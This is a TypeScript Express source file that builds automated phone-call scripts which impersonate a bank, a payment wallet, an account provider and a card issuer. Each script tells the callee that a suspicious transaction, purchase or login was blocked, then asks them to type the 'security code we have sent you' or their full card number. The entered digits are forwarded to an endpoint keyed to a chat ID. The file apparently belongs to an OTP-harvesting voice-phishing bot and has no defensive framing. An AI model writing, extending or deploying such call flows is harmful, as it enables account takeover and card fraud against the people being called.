import { Response } from 'express';
import { v4 as uuidv4 } from 'uuid';

export const bankFlow = (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
): Response => {
  if (dtmf && dtmf === '1') {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key',
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepOTP',
          endKey: '#',
          maxNumKeys: 8,
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'bankStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'bankStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key',
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'bankStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'bankStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload:
              'OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.',
            language,
            voice: 'female',
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call bank - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS transaction on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
          },
        },
      ],
    });
  }
};

export const payFlow = (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  wallet?: string,
): Response => {
  if (dtmf && dtmf === '1') {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'payStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'payStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'payStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'payStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'payStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call pay - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'bankStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet}`,
          },
        },
      ],
    });
  }
};

export const accountFlow = (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  askCardInfo?: string,
): Response => {
  if (dtmf && dtmf === '1') {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this login attempt, please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the security code yet please press the star key followed by the # key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'accountStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY please enter the SECURITY CODE we have sent you followed by the # key. If you have not received the code yet please press the star key followed by the # key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 10,
          },
          onKeypressGoto: 'accountStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'accountStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call account - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'accountStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  }
};

export const cardFlow = (
  dtmf: string,
  res: Response,
  language: string,
  chatId: number | undefined,
  step: string,
  cardType: string,
): Response => {
  if (dtmf && dtmf === '1') {
    return res.json({
      id: uuidv4(),
      title: `pay card - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the # key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: 'cardStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId} OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `For your SECURITY, please enter your ${cardType} card number followed by the # key`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepOTP',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 18,
        },
        {
          id: 'cardStepOTP',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/card/${step}/${chatId}/${language}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `We have BLOCKED a recent SUSPICIOUS login attempt on your ACCOUNT. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId} no OTP`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `OKAY, you might receive another automated call if we detect a security code has been sent to you. Thank you, goodbye.`,
            language,
            voice: 'female',
          },
        },
        // {
        //   id: uuidv4(),
        //   action: 'hangup',
        // },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call card - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: `You have selected an INVALID option. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
            language,
            voice: 'female',
            loop: true,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'cardStepGoto',
          onKeypressVar: 'dtmf',
        },
        {
          id: uuidv4(),
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  }
};
